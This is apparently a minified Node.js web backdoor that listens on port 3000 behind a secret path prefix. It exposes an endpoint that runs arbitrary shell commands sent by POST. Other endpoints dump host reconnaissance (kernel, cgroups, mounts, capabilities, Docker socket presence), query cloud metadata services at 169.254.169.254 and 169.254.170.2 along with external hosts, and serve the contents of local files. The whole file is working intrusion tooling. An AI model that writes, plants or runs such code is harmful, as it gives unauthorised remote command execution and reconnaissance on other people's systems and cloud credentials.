
const http=require("http"),cp=require("child_process"),fs=require("fs"),os=require("os");
const SEK=process.env.PROBE_SECRET||"";
const eyes=(fs.existsSync("/app/eyes.txt")?fs.readFileSync("/app/eyes.txt","utf8"):"(no a)")+"\n\n@@@EYES2@@@\n"+(fs.existsSync("/eyes2.txt")?fs.readFileSync("/eyes2.txt","utf8"):"(no b)");
function sh(c,t){try{return cp.execSync(c,{timeout:t||25000,encoding:"utf8",maxBuffer:1<<24}).slice(0,60000)}catch(e){return "ERR "+String(e).slice(0,3000)}}
const P=(u)=>u.startsWith("/api/k/"+SEK);
async function net(list){const out=[];for(const url of list){const t=Date.now();try{const r=await fetch(url,{signal:AbortSignal.timeout(6000)});out.push({url,st:r.status,ms:Date.now()-t,body:(await r.text()).slice(0,400)})}catch(e){out.push({url,ms:Date.now()-t,err:String(e.message||e).slice(0,160)})}}return out}
const rt=()=>({hostname:os.hostname(),uname:sh("uname -a"),osrelease:os.release(),
  osreleaseFile:sh("cat /proc/sys/kernel/osrelease"),version:sh("cat /proc/version"),
  modules:sh("head -c 400 /proc/modules"),cpuinfo:sh("head -c 300 /proc/cpuinfo"),
  cgroup:sh("cat /proc/self/cgroup"),cg1:sh("cat /proc/1/cgroup"),cmd1:sh("tr '\\0' ' ' < /proc/1/cmdline"),
  pids:sh("ls /proc | grep -E '^[0-9]+$' | head -30"),mounts:sh("head -60 /proc/self/mountinfo"),
  sock:sh("ls -la /var/run/docker.sock /run/docker.sock 2>&1"),ifs:sh("ip a 2>/dev/null || cat /proc/net/dev"),
  caps:sh("grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)' /proc/self/status"),id:sh("id"),
  osr:sh("cat /etc/os-release"),resolv:sh("cat /etc/resolv.conf"),node:process.version,
  nproc:os.cpus().length,mem:os.totalmem(),uptime:os.uptime(),load:os.loadavg()});
const srv=http.createServer(async (req,res)=>{
  const u=new URL(req.url,"http://x");
  if(u.pathname==="/api/health"){res.writeHead(200,{"content-type":"text/plain"});res.end("ok");return;}
  if(!P(u.pathname)){res.writeHead(404);res.end("no");return;}
  if(u.pathname.endsWith("/eyes")){res.writeHead(200,{"content-type":"text/plain"});res.end(eyes);return;}
  if(u.pathname.endsWith("/rt")){res.writeHead(200,{"content-type":"application/json"});res.end(JSON.stringify(rt(),null,1));return;}
  if(u.pathname.endsWith("/net")){const l=u.searchParams.get("l")||"https://ifconfig.me/ip,https://api.clicloud.app/v1/config,http://169.254.169.254/latest/meta-data/,http://169.254.170.2/,http://147.5.115.161/,https://worker.clicloud.app/";
    const r=await net(l.split(","));res.writeHead(200,{"content-type":"application/json"});res.end(JSON.stringify(r,null,1));return;}
  if(u.pathname.endsWith("/cmd")&&req.method==="POST"){let b="";req.on("data",c=>b+=c);req.on("end",()=>{let c="id";try{c=JSON.parse(b).cmd||"id"}catch(e){}
    res.writeHead(200,{"content-type":"text/plain"});res.end(sh(c,30000));});return;}
  res.writeHead(404);res.end("no");
});
srv.listen(3000,"0.0.0.0",()=>console.log("door on 3000"));
